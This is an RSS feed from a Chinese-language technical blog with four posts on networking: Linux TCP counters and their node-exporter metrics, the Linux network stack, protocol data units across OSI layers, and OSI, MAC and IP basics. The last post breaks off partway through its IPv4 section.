<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>network on Cylon&#39;s Collection</title>
    <link>https://www.oomkill.com/categories/network/</link>
    <description>Recent content in network on Cylon&#39;s Collection</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Thu, 26 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://www.oomkill.com/categories/network/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Linux网络子系统中的计数器</title>
      <link>https://www.oomkill.com/2023/10/linux-network-conunter/</link>
      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2023/10/linux-network-conunter/</guid>
      <description></description>
      <content:encoded><![CDATA[<p>在Prometheus node-exporter中，存在多个网络监控指标指标标志着主机的网络状态，但是大家常常忽略这些指标，而这些指标又很重要，这些指标的来源是根据Linux网络子系统中的多个计数器定义的，本文就解开这些TCP计数器的面目。</p>
<h2 id="tcpextlistenoverflows-和-tcpextlistendrops">TcpExtListenOverflows 和 TcpExtListenDrops</h2>
<p>当内核从客户端接收到 SYN 时，如果 TCP 接受队列已满，内核将丢弃 SYN 并将 TcpExtListenOverflows +1。同时内核也会给TcpExtListenDrops +1。当 TCP 套接字处于 LISTEN 状态，并且<font color="#f8070d" size=3>内核需要丢弃数据包时，内核总是将 TcpExtListenDrops +1</font>。因此，增加 TcpExtListenOverflows 将使 TcpExtListenDrops 同时增加，但在不增加 TcpExtListenOverflows 的情况下，TcpExtListenDrops 也会增加，例如内存分配失败也会导致 TcpExtListenDrops 增加。</p>
<p>以上解释基于内核 4.10 或更高版本，在旧内核上，当 TCP 接受队列已满时，TCP Stack有不同的行为。在旧内核上，TCP Stack不会丢弃 SYN，它会完成 3 次握手。当接受队列已满时，TCP 堆栈会将套接字保留在 TCP 半开队列中。由于处于半开队列中，TCP 堆栈将在指数退避计时器上发送 SYN+ACK，在客户端回复 ACK 后，TCP  Stack检查接受队列是否仍满，如果未满，则将套接字移至接受队列如果队列已满，则将套接字保留在半开队列中，下次客户端回复ACK时，该套接字将有另一次机会移至接受队列。</p>
<p>这两个计数器在 node_expoter 中的指标是：</p>
<ul>
<li>node_netstat_TcpExt_ListenDrops</li>
<li>node_netstat_TcpExt_ListenOverflows</li>
</ul>
<h2 id="tcpinsegs-和-tcpoutsegs">TcpInSegs 和 TcpOutSegs</h2>
<p>TcpInSegs 和 TcpOutSegs 都是被定义在 RFC1213 <sup><a href="#1">[1]</a></sup></p>
<p><em>TcpInSegs</em> 是指 TCP layer 接收到的数据包数量，包括错误接收的数据包，例如校验和错误、无效的TCP头等。只有一个错误不会被包含在内：<font color="#f8070d" size=3>如果第 2 层目标地址不是 NIC 的第 2 层地址。如果数据包是多播或广播数据包，或者 NIC 处于混杂模式，则可能会发生这种情况</font>。在这些情况下，数据包将被传递到 TCP 层，但 TCP 层将在增加 TcpInSegs 之前丢弃这些数据包。 TcpInSegs 计数器不知道 GRO (<em>Generic Receive Offload</em>)。因此，如果两个数据包被 GRO 合并，TcpInSegs 计数器只会增加 1。</p>
<p><em>TcpOutSegs</em> 是指 TCP layer 发送的数据包数量，它排除了重传的数据包。但它包括 SYN, ACK 和 <font color="#f8070d" size=3>RST</font> 数据包。与 <em>TcpInSegs</em> 不同，TcpOutSegs 能够识别 GSO (<em>Generic Receive Offload</em>)，因此如果数据包被 GSO 分割为 2，TcpOutSegs 将增加 2。</p>
<p>这两个计数器在 node_expoter 中的指标是：</p>
<ul>
<li>node_netstat_Tcp_InSegs</li>
<li>node_netstat_Tcp_OutRsts</li>
</ul>
<h2 id="tcppassiveopens-和-tcpactiveopens">TcpPassiveOpens 和 TcpActiveOpens</h2>
<p>TcpPassiveOpens 和 TcpActiveOpens 都是被定义在 RFC1213 <sup><a href="#1">[1]</a></sup></p>
<p><em>TcpPassiveOpens</em> 是指 TCP层收到一个SYN，回复一个 SYN+ACK，进入 SYN-RCVD 状态。</p>
<p><em>TcpActiveOpens</em> 是指 TCP 层发送了一个SYN，并进入 SYN-SENT 状态。<font color="#f8070d" size=3>每次 TcpActiveOpens +1，TcpOutSegs 应始终+1</font>。</p>
<p>这两个计数器在 node_expoter 中的指标是：</p>
<ul>
<li>node_netstat_Tcp_PassiveOpens</li>
<li>node_netstat_Tcp_ActiveOpens</li>
</ul>
<h2 id="tcpestabresets-和-tcpoutrsts">TcpEstabResets 和 TcpOutRsts</h2>
<p>TcpEstabResets 和 TcpOutRsts 都是被定义在 RFC1213 <sup><a href="#1">[1]</a></sup></p>
<p><em>TcpEstabResets</em> 指 TCP 连接从 ESTABLISHED 状态或 CLOSE-WAIT 状态直接转换到 CLOSED 状态的次数。</p>
<p><em>TcpOutRsts</em> 指发送的包含 RST 标志的 TCP 段的数量。</p>
<p>这两个计数器在 node_expoter 中的指标是：</p>
<ul>
<li>node_netstat_Tcp_OutRsts</li>
<li>node_netstat_Tcp_ActiveOpens</li>
</ul>
<h2 id="tcpsynretrans">TCPSynRetrans</h2>
<p>SYN 和 SYN/ACK 重传 (Retransmit )次数，将重传分为 SYN, 快速重传, 超时重传等。</p>
<p>这个计数器在 node_expoter 中的指标是：</p>
<ul>
<li>node_netstat_TcpExt_TCPSynRetrans</li>
</ul>
<h2 id="reference">Reference</h2>
<p><sup id="1">[1]</sup> <a href="https://tools.ietf.org/html/rfc1213#page-48"><em><strong>RFC1213</strong></em></a></p>
<p><sup id="2">[2]</sup> <a href="https://docs.kernel.org/networking/snmp_counter.html"><em><strong>SNMP counter</strong></em></a></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Linux网络栈</title>
      <link>https://www.oomkill.com/2022/10/network-stack/</link>
      <pubDate>Fri, 28 Oct 2022 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2022/10/network-stack/</guid>
      <description></description>
      <content:encoded><![CDATA[<h2 id="linux-架构概述-supa-href11asup">Linux 架构概述 <sup><a href="#1">[1]</a></sup></h2>
<p>本章节简单阐述Linux系统的结构，并讨论子系统中的模块之间以及与其他子系统之间的关系。</p>
<p>Linux内核本身鼓励无用，是作为一个操作系统的一部分参与的，只有为一个整体时他才是一个有用的实体，下图展示了Linux操作系统的分层</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221028214224508.png" alt="image-20221028214224508"  /></p>
<center>图：Linux子系统分层图</center>
<center><em>Source：</em>https://docs.huihoo.com/linux/kernel/a1/index.html</center><br>
<p>由图可以看出Linux操作系统由四部分组成：</p>
<ul>
<li>用户应用</li>
<li>OS服务，操作系统的一部分（例如shell）内核编程接口等</li>
<li>内核</li>
<li>硬件控制器，CPU、内存硬件、硬盘和NIC等都数据这部分</li>
</ul>
<h2 id="linux内核阐述">Linux内核阐述</h2>
<p>Linux内核将所有硬件抽象为一致的接口，为用户进程提供了一个虚拟接口，使用户无需知道计算机上安装了哪些物理硬件即可编写进程，并且Linux支持用户进程的多任务处理，每个进程都可以视作为操作系统的唯一进程独享硬件资源。内核负责维护多个用户进程，并协调其对硬件资源的访问，使得每个进程都可以公平的访问资源，并保证进程间安全。</p>
<p>Linux内核主要为五个子系统组成：</p>
<ul>
<li>进程调度器(<em><strong>SCHED</strong></em>)， 控制进程对 CPU 的访问。调度程序执行策略，确保进程可以公平地访问 CPU。</li>
<li>内存管理器 (<em><strong>MM</strong></em>)， 允许多个进程安全地共享操作系统的内存</li>
<li>虚拟文件系统 (<em><strong>VFS</strong></em>)，向所有设备提供通用文件接口来抽象出各种硬件设备</li>
<li>网络接口 (<em><strong>NET</strong></em>)，提供对多种网络标准与各种网络硬件的访问</li>
<li>进程间通信 (<em><strong>IPC</strong></em>)，在单个操作系统上的多种机制进程间通信机制</li>
</ul>
<h2 id="网络子系统架构-supa-href22asup">网络子系统架构 <sup><a href="#2">[2]</a></sup></h2>
<p>网络子系统功能主要是允许 Linux 系统通过网络连接到其他系统。支持多种硬件设备，以及可以使用的多种网络协议。网络子系统抽象了这两个实现细节，以便用户进程和其他内核子系统可以访问网络，而不必知道使用什么物理设备或协议。</p>
<p>子系统模块包含</p>
<ul>
<li>网络设备驱动层 (<em><strong>Network device drivers</strong></em>)，网络设备驱动程序与硬件设备通信。每个硬件设备都有对应的设备驱动程序模块。</li>
<li>独立设备接口层(<em><strong>device independent interface</strong></em>)，设备独立接口提供了所有硬件设备的统一视图，因此在网络子系统之上的级别无需了解硬件信息</li>
<li>网络协议层 (<em><strong>network protocol</strong></em>)，网络协议实现了网络传输的协议</li>
<li>协议独立/无关接口层 (<em><strong>protocol independent interface</strong></em>)，提供了独立于硬件设备的网络接口，为内核内其他子系统访问网络时不依赖特定的协议和硬件接口。</li>
<li>系统调用层 (<em><strong>system call</strong></em>) 用于限制用户进程导出资源的访问</li>
</ul>
<p>网络子系统的结构图如下图所示，</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221029170129050.png" alt="image-20221029170129050"  /></p>
<center>图：网络子系统中的上下文</center>
<center><em>Source：</em>https://docs.huihoo.com/linux/kernel/a1/index.html</center><br>
<p>当网络子系统转换为网络栈时，如下图所示</p>
<p>
  <img loading="lazy" src="https://miro.medium.com/max/700/1*LcGaDm_ZOCbrIerM2UDj0g.png" alt="img"  /></p>
<center>图：ISO Stack与TCP/IP Stack</center>
<center><em>Source：</em>https://www.washington.edu/R870/Networking.html</center><br>
<p>当然Linux网络子系统是类似于TCP/IP栈的一种结构，当发生一个网络传输时，数据包会按照所经过的层进行封装。例如应用层应用提供了REST API，那么应用将要传输的数据封装为HTTP协议，然后传递给向下的传输层。传输层是TCP协议就会被添加对应的TCP包头。整个封装过程原始包保持不变，会根据所经过层的不同增加固定格式的包头。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/understandlni_1304.jpg" alt="img"  /></p>
<center>图：数据包传输在每层被封装的过程</center>
<center><em>Source：</em>http://www.embeddedlinux.org.cn/linux_net/0596002556/understandlni-CHP-13-SECT-1.html</center><br>
<p>对于Linux来说TCP/IP 的五层结构则是构成网络子系统的的核心组件，下图是Linux网络栈结构图</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221030005922405.png" alt="image-20221030005922405"  /></p>
<center>图：Linux网络栈的结构图</center>
<center><em>Source：</em>https://medium.com/geekculture/linux-networking-deep-dive-731848d791c0</center><br>
<ul>
<li>图中橙色部分是位于TCP/IP的五层结构中的应用层，应用层向下通讯通过 <code>system call</code> 与 socket接口进行交互</li>
<li>蓝色部分是位于内核空间，socket向下则是传输层与网络层</li>
<li>最底层是物理层包含网卡驱动与NIC</li>
</ul>
<p>通过图可以看出，NIC是发送与接收数据包的基本单位，当系统启动时内核通过驱动程序向操作系统注册网卡，当数据包到达网卡时，被放入队列中。内核通过硬中断，运行中断处理程序，为网络帧分配内核数据结构(sk_buff)，并将其拷贝到缓冲区中，此为内核与网卡交互的过程。</p>
<p>网卡硬中断只处理网卡核心数据的读取或发送，网络协议栈中的大部分处理都在软中断中进行处理。内核协议栈将从缓冲区中取出网络帧，通过网络协议栈，从下到上的根据网络栈结构逐层处理这个网络帧。</p>
<h2 id="socket-supa-href44asup">Socket <sup><a href="#4">[4]</a></sup></h2>
<p>Unix Socket是一种使用了Unix文件描述符的IPC机制，在网络栈中是位于内核空间网络栈的一层，是一个用户空间与传输层之间的一个接口，可以为网络连接, 文本文件, 终端或其他；他的行为很像一个文件描述符，因为信息的读写，<code>read()</code>, <code>write()</code>与文件的方式很相似。下图是socket通信模型。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221031203257214.png" alt="image-20221031203257214"  /></p>
<center>图：socket通信模型</center>
<center><em>Source：</em>https://slideplayer.com/slide/10740698/</center><br>
<p>作为用户空间到内核空间的第一层，Socket位于两层之间，由于IPC机制支持不同的通讯协议以及需要对不同的网络协议进行访问，故这些协议实现为位于socket的层，这种情况下，用户空间仅通过系统调用socket接口，而内核空间负责一些其他工作，例如，缓冲区管理，标准协议接口，网络接口与各种不同的网络协议。</p>
<blockquote>
<p>Notes:</p>
<ul>
<li><code>/etc/protocols</code> 定义的协议号</li>
<li><code>/etc/services</code> 定义的服务的端口号</li>
</ul>
</blockquote>
<h2 id="网络栈的工作原理">网络栈的工作原理</h2>
<p>当网络包到达时，网卡（硬中断+DMA）通过DMA将网络数据包放入队列中，告知中断程序硬中断已收到网络数据包。</p>
<h3 id="数据包的发送">数据包的发送</h3>
<p>用户程序发送网络包时，通过网络栈模型自上而下逐层处理帧：</p>
<ul>
<li>应用层：通过系统调用，调用socket API发送网络包，会被限制在内核空间的socket层，socket层将数据包放入到缓冲区内。</li>
<li>传输层：网络栈从socket取出数据包，传输层添加TCP标头</li>
<li>网络层：将IP添加到数据标头，根据MTU大小分片</li>
<li>数据链路层：MAC地址寻址，并添加到帧头尾，将帧放入发送队列，触发软中断通知</li>
<li>物理层：网卡驱动通过DMA从发送队列读取网络帧，通过网卡发送出</li>
</ul>
<h3 id="数据包的接收">数据包的接收</h3>
<p>内核网络栈从缓冲区读取帧，通过网络栈模型自下而上逐层处理帧：</p>
<ul>
<li>数据链路层：
<ul>
<li>检查数据包的有效性</li>
<li>确定网络协议类型 IPV4 or IPV6</li>
<li>去除帧 头, 尾</li>
</ul>
</li>
<li>网络层：
<ul>
<li>取出IP头，确定网络流量的方向（转发或者本机流量）</li>
<li>删除标头，传递给传输层</li>
</ul>
</li>
<li>传输层：取出TCP/UDP协议头，根据源IP, 目的IP, 源端口, 目的端口作为标识找到socket，将数据报文放置socket缓冲区</li>
<li>应用层：应用程序通过socket来读数据</li>
</ul>
<p>下图为网络栈收/发数据的结构图</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221031210517384.png" alt="image-20221031210517384"  /></p>
<center>图：Linux网络进程接收网络数据包流程图</center>
<center><em>Source：</em>https://slideplayer.com/slide/10740698/</center><br>
<h2 id="网络子系统分层结构">网络子系统分层结构</h2>
<p>在了解了网络接受网络数据包的流程后，还需要对网络子系统中分层结构进行了解，在该结构中将需要基础掌握一些对于工作与网络子系统中的API的命令是如何调用的。</p>
<p>下图是结合 《深入理解Linux网络技术内幕》第13章 <sup><a href="#3">[3]</a></sup> 中插图13-2与 托马斯格拉夫发表于2019年的文章 &ldquo;How to Make Linux Microservice-Aware with Cilium and eBPF&rdquo; <sup><a href="#5">[5]</a></sup> 的结合旨在让零基础同学可以更好的了解到各API的分层调用</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221104153434745.png" alt="image-20221104153434745"  /></p>
<center>图：Linux网络子系统分层调用</center><br>
<p>图中可以看出，是一个基于TCP/IP栈的调用模型，其中应用层包含了常用的工具：</p>
<ul>
<li>配置IP路由：<code>ip</code></li>
<li>ip防火墙（包过滤）：<code>iptables</code></li>
<li>流量整形：<code>tc</code></li>
<li>网络抓包：<code>tcpdump</code></li>
<li>网卡信息：<code>ethtool</code></li>
</ul>
<p>对于云原生网络中，了解完整的分层是非常重要的，这将有利于开发基于eBPF服务。下面就简单的论证下该图</p>
<p>正如图中所示，所有的网络命令都是提供给用户的用户空间API，当发生网络动作时是需要通过内核将数据导入/出，这里使用了系统调用，调用内核提供的导入到用户空间的接口，例如 <code>socket</code>，<code>sysctl</code> 等，更多的接口介绍可以详见《深入理解Linux网络技术内幕》第3章 <sup><a href="#6">[6]</a></sup></p>
<p>到达socket后，继续向下通信时，socket提供了几种级别的接口，这些可以在常见编程语言包中被提供</p>
<ul>
<li><code>AE_PACKAGE</code> / <code>PE_PACKAGE</code>：提供设备级别的API，通俗来讲，就是在网络层之下发送/接受消息的接口，工作于2层，这将允许用户在用户空间实现物理层数据包发送和接收</li>
<li><code>AF_INET</code> / <code>PE_INET</code>：是基于网络层Socket类型，<code>AF_INET</code>是指IPv4，<code>AF_INET6</code> 是IPv6，这里就是IP 地址和端口号。</li>
</ul>
<p>如图所示，对于 <code>PE_PACKAGE</code> 套接字类型而言，Linux在链路层捕捉帧并将其注入至链路层的方式，这样跳过了所有的中间层，例如 <code>tcpdump</code> 与 <code>ethtool</code>， <code>PE_PACKAGE</code> 套接字通过将帧直接交给 <code>dev_queue_xmit</code>。</p>
<ul>
<li><code>dev_queue_xmit</code> 是传输 buffer (<code>sk_buff</code>) 到网络设备中的函数，将封包传递给TC或QoS层，L3封包时调用</li>
</ul>
<p>接下来是iptables，netfilter，是工作与多层协议栈中一系列hook，用户端由命令行工具iptables/nftables控制，可以在数据包经由的数据点上被调用对应的hook函数来改变包的行为。所有的数据包都独立存在于对应的协议栈，经过的数据包会便利所有对应的hook，因为iptables(etables)支持工作于L2的ARP协议。所有的hook都存在与每个网络名称空间内，并且每个网络设备都拥有ingress hook，这也是云原生网络中提到的为什么使用eBPF 跳过netfilter框架可以提升网络性能。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/understandlni_1801.jpg" alt="img"  /></p>
<center>图：Linux 栈中经由netfilter框架示意图</center>
<center><em>Source：</em>http://www.embeddedlinux.org.cn/linux_net/0596002556/understandlni-CHP-18-SECT-1.html</center><br>
<p>接下来就是传统的一些应用，例如telnet，ping都是使用了<code>AE_PACKAGE</code> / <code>PE_PACKAGE</code> 传统联网模式</p>
<p>最后一个点就是 <em><strong>traffic control</strong></em> TC，是工作与L2的一组队列与其机制组成的，通常情况下是一个队列，上面也提到，所有的设备都是使用队列来调度底层设备进入的数据包，liunx中默认的队列是 <code>qdisc </code> 。</p>
<h2 id="reference">Reference</h2>
<blockquote>
<p><sup id="1">[1]</sup> <a href="https://docs.huihoo.com/linux/kernel/a1/index.html"><em><strong>Conceptual Architecture of the Linux Kernel</strong></em></a></p>
<p><sup id="2">[2]</sup> <a href="https://medium.com/geekculture/linux-networking-deep-dive-731848d791c0"><em><strong>Linux — Networking Deep Dive</strong></em></a></p>
<p><sup id="3">[3]</sup> <a href="http://www.embeddedlinux.org.cn/linux_net/0596002556/understandlni-CHP-13-SECT-1.html"><em><strong>Network Stack Chapter13</strong></em></a></p>
<p><sup id="4">[4]</sup> <a href="https://notes.shichao.io/tcpv1/ch10/"><em><strong>User Datagram Protocol (UDP) and IP Fragmentation</strong></em></a></p>
<p><sup id="5">[5]</sup> <a href="https://www.infoq.com/presentations/linux-cilium-ebpf/"><em><strong>How to Make Linux Microservice-Aware with Cilium and eBPF</strong></em></a></p>
<p><sup id="6">[6]</sup> <a href="http://www.embeddedlinux.org.cn/linux_net/0596002556/understandlni-CHP-3-SECT-1.html"><em><strong>Network Stack Chapter13</strong></em></a></p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>为什么网络是分层的</title>
      <link>https://www.oomkill.com/2022/10/network-unit-in-osi/</link>
      <pubDate>Fri, 28 Oct 2022 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2022/10/network-unit-in-osi/</guid>
      <description></description>
      <content:encoded><![CDATA[<h2 id="overview-supa-href11asup">Overview <sup><a href="#1">[1]</a></sup></h2>
<p>协议数据单元 <em><strong>Protocol Data Unit</strong></em> (PDU) 是应用于OSI模型中的数据结构，在OSI模型中每一层都会被添加一个header，tailer进行封装，header, tailer加原始报文的组合就是PDU。</p>
<p>在每层中，PDU的名称都是不同的，这也是很多人的疑问，一会数据报文称为数据包，一会数据报文成为数据帧，该文介绍网络中的单元，以了解之间的区别</p>
<h2 id="物理层">物理层</h2>
<p>物理层数据的呈现方式是以 “位” (<em><strong>bit</strong></em>) 为单位的，即0 1，在该层中数据以二进制形式进行传输</p>
<h2 id="数据链路层-supa-href22asup">数据链路层 <sup><a href="#2">[2]</a></sup></h2>
<p>到达数据链路层，实际上可以说进入了TCP/IP栈对底层，而该层的单位为 ”帧“ (<em><strong>frame</strong></em>)，该层中，MAC地址会被封装到数据包中，比如以太网帧，PPP帧都是指该层的数据包</p>
<p>该层中数据帧包含：</p>
<ul>
<li>源MAC</li>
<li>目的MAC</li>
<li>数据，由网络层给出的</li>
<li>数据的总长度</li>
<li>校验序列</li>
</ul>
<h2 id="网络层-supa-href33asup">网络层 <sup><a href="#3">[3]</a></sup></h2>
<p>在网络层中协议数据单元被称为数据 “包&quot; (<em><strong>package</strong></em>) ，是网络间节点通讯的基本单位。该层中IP地址会被封装到数据包内。</p>
<p>该层中数据包包含：</p>
<ul>
<li>标头：源IP，目的IP，协议，数据包编号，帮助数据包匹配网络的位</li>
<li>payload：数据包的主体</li>
<li>标尾：包含几个位，用于告知已到达数据包的末尾与错误检查（循环冗余检查 (<em><strong>CRC</strong></em>)）</li>
</ul>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/eyJidWNrZXQiOiJjb250ZW50Lmhzd3N0YXRpYy5jb20iLCJrZXkiOiJnaWZcL3F1ZXN0aW9uNTI1LXBhY2tldC5naWYiLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjI5MH0sInRvRm9ybWF0IjoiYXZpZiJ9fQ%3D%3D" alt="img"  /></p>
<center>图：数据包组成</center>
<center><em>Source：</em>https://computer.howstuffworks.com/question525.htm</center><br>
<p>例如一个电子邮件，假设电子邮件大小尾3500bit，发送时使用1024的固定大小数据包进行发送，那么每个数据包标头为 96bits，标尾为 32bit，剩余 896bits 将用于实际的数据大小。这里为3500bits，会被分为4个数据包，前三个数据包为 896bits，最后一个数据包大小为 812bits。接收端会根据包编号进行解包重组</p>
<h2 id="传输层">传输层</h2>
<h3 id="segment">Segment</h3>
<p>在传输层TCP协议的协议数据单元被称为 ”段“  (<em><strong>Segment</strong></em>) ，上面讲到，IP数据包会以固定大小的数据包进行发送，如果超出大小的会被划分为多个数据包，每个数据包的碎片就被称之为<em><strong>Segment</strong></em>。</p>
<p>数据包分割通常会发生在该层，当发生下列场景时会需要分段</p>
<ul>
<li>数据包大于网络支持的最大传输单元 (<em><strong>MTU</strong></em>)</li>
<li>网络不可靠，将数据包分为更小的包</li>
</ul>
<h3 id="datagram-supa-href44asup">datagram <sup><a href="#4">[4]</a></sup></h3>
<p>在传输层UDP协议的协议数据单元被称为 ”数据报“ (<em><strong>datagram</strong></em>) ，datagram是一种逐层增加的设计，用于无连接通讯</p>
<p>下图是一个UDP数据报被封装位一个IP数据包：IPv4字段值位17 表示udp协议</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/figure_10-1_600.png" alt="img"  /></p>
<center>图：udp的IP包</center>
<center><em>Source：</em>https://notes.shichao.io/tcpv1/ch10</center><br>
<p>对于udp数据报的组成包含header与payload，udp的header大小为固定的8字节</p>
<ul>
<li><strong>源端口</strong>：可选</li>
<li><strong>目的端口</strong>：识别接收信息的进程</li>
<li><strong>Length</strong>：udp header + udp payload的长度，最小值为8</li>
<li><strong>checksum</strong>：与lenght一样其实是多余的，因为第三层包含了这两个信息</li>
</ul>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/figure_10-2_600.png" alt="img"  /></p>
<center>图：udp数据报组成</center>
<center><em>Source：</em>https://notes.shichao.io/tcpv1/ch10</center><br>
<blockquote>
<p>Notes：使用UDP时应注意避免分段，例如帧中MTU为 1500 字节，假设 IPv4 header为 20 字节，UDP header 为 8 字节，则应用程序最多为数据留下 1472 字节以避免碎片</p>
</blockquote>
<h2 id="数据">数据</h2>
<p>对于传输层之上，协议数据单元没有特定的名词，可以统称为协议数据单元或者数据，整个PDU分层结构图如下图所示，其中 T 表示 Trailer，H 表示 Header，通常H包含源地址和目的地址及一些用于管理通信的控制信息。T含错误检查之类的信息或标志 PDU 结束的字段。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/page108.gif" alt="img"  /></p>
<center>图：PDU分层结构图</center>
<center><em>Source：</em>http://www.telecomworld101.com/Intro2dcRev2/page108.html</center><br>
<blockquote>
<p>Notes：每层的数据字段都由上一层PDU组成，通常情况下，每层只知道自己该层的信息，如网络层仅知道对端网络层，而不知道数据链路层或传输层</p>
</blockquote>
<h2 id="reference">Reference</h2>
<blockquote>
<p><sup id="1">[1]</sup> <a href="http://www.telecomworld101.com/Intro2dcRev2/page108.html"><em><strong>Protocol Data Unit</strong></em></a></p>
<p><sup id="2">[2]</sup> <a href="https://www.slashroot.in/difference-between-segments-packets-and-frames"><em><strong>difference between segments packets and frames</strong></em></a></p>
<p><sup id="3">[3]</sup> <a href="https://computer.howstuffworks.com/question525.htm"><em><strong>What is a packet?</strong></em></a></p>
<p><sup id="4">[4]</sup> <a href="https://notes.shichao.io/tcpv1/ch10/"><em><strong>User Datagram Protocol (UDP) and IP Fragmentation</strong></em></a></p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>OSI模型与IP协议</title>
      <link>https://www.oomkill.com/2022/06/osi-network-basics/</link>
      <pubDate>Sat, 18 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2022/06/osi-network-basics/</guid>
      <description></description>
      <content:encoded><![CDATA[<h2 id="osi-model">OSI Model</h2>
<p>OSI 七层网络模型如下（由下到上）：</p>
<ul>
<li><strong>应用层</strong> <em>Application layer</em> ：直接接触用户数据的层。软件应用程序依靠应用层发起通信。这里的应用值得是协议而不是客户端软件；应用层协议包括 HTTP, SMTP, FTP, DNS,Telnet, etc..</li>
<li><strong>表示层</strong> <em>Presentation layer</em>：表示层充当角色为<em>网络数据转换器</em>，负责完成数据转换，加密和压缩</li>
<li><strong>会话层</strong> <em>Session layer</em>：负责建立、管理和终止两个设备之间的通信</li>
<li><strong>传输层</strong> <em>Transport layer</em>：负责两个设备间的端到端通信。包括从会话层提取数据，将数据分解为多个区块（称为数据段）；传输层协议包括，TCP, UDP</li>
<li><strong>网络层</strong> <em>Network layer</em>：负责管理网络地址，定位设备，决定路由，通俗来讲是负责*&ldquo;不同&rdquo;*网络之间的传输，也就是路由功能；网络层协议包括 IP,ARP,ICMP；代表设备 3 layer swtich, router, firewall。相应就代表对应网络协议也是三层的，如RIP, OSPF, BGP</li>
<li><strong>数据链路层</strong> <em>Data link layer</em>：数据链路层负责*&ldquo;同一&rdquo;*网络上设备之间的数据传输；该层协议包括 Ethernet, PPP(<em>Point-to-Point Protocol</em>)；代表设备 Switch,Bridges，同样的MAC地址也是该层的</li>
<li><strong>物理层</strong> <em>Physical layer</em>：该层表示参与数据传输的物理设备，如网线，同时还负责将数据转换为位流，也就是由 1 和 0 构成的字符串。</li>
</ul>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20220811233536367.png" alt="image-20220811233536367"  /></p>
<center>图：OSI七层模型</center>
<center><em>Source：</em>https://www.cloudflare.com/zh-cn/learning/ddos/glossary/open-systems-interconnection-model-osi/</center>
<h2 id="mac">MAC</h2>
<h3 id="mac地址介绍">MAC地址介绍</h3>
<p>MAC (Media Access Control) 地址用来定义网络设备的位置，由48比特长，12位的16进制组成，其中从左到右，0-23bit为厂商想IETF等机构申请用来标识厂商的代码OUI Organizationally-Unique Identifier，24-47bit由厂商自行分配，是厂商制造所有网卡的唯一编号。如<code>00-50-56-C0-00-08</code></p>
<h3 id="mac地址类型">MAC地址类型</h3>
<p>MAC地址分为三种类型：</p>
<ul>
<li>物理MAC地址：Mac地址唯一的标识了以太网的一个终端，该地址为全球唯一的硬件地址。</li>
<li>广播(broadcast) MAC地址：每个比特都是 1 的 MAC 地址。广播 MAC 地址是组播 MAC 地址的一个特例。<code>11111111-11111111-11111111-11111111-11111111-11111111</code> 16进制表示为 <code>FF-FF-FF-FF-FF-FF</code>。</li>
<li>组播(multicast) MAC地址：第一个字节的最低位是 1 的 MAC 地址。二进制表示为 <code>xxxxxxx1-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx </code> ；16进制表示为<code>01-00-00-00-00-00</code>。如 <code>a5-a9-a6-aa-5a-a6</code> 这个mac地址的第一个字节的最低位 16进制<code>a5</code> 转换为二进制为<code>10100101</code> 最后一位为1就是组播MAC地址。</li>
<li>单播 (unicast) MAC 地址：第一个字节的最低位是 0 的 MAC 地址 <code>xxxxxxx0-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx</code>。</li>
</ul>
<h3 id="静态mac地址">静态MAC地址</h3>
<p>由用户通过命令配置的静态转发的MAC地址，静态MAC地址和动态MAC地址的功能不同，静态地址一旦被加入，该地址在删除之前将一直有效，不受最大老化时间的限制</p>
<h3 id="动态mac地址">动态MAC地址</h3>
<p>由交换机从接受到报文自动学习到的MAC地址，当端口收到一个报文时，会查找报文的源MAC地址是否存在于MAC地址表中，如果不存在则会将相应的端口、VLAN和源MAC地址关联起来，并保存到MAC地址表中，动态MAC地址在达到一定老化时间后，会被老化删除，但如果该地址在老化时间内被正确使用过，则会重新激活地址的老化时间。</p>
<h3 id="过滤mac地址黑洞mac地址">过滤MAC地址、黑洞MAC地址</h3>
<p>有用户通过命令配置的静态过滤MAC，当网关接收到的报文中，源或目的MAC地址为过滤MAC地址，则直接丢弃该报文。</p>
<h2 id="ip地址">IP地址</h2>
<p>IP地址是在计算机网络中用来标识一个设备的一组数字，IPv4是由32位二进制数值组成，单为了便于用户识别记忆，采用了点分十进制表示法，这种表示法的IPv4地址有4个点分十进制证书来标识，每个十进制证书对应一个字节。</p>
<h3 id="ipv4">IPV4</h3>
<p>IPv4地址有如下两个部分组成：</p>
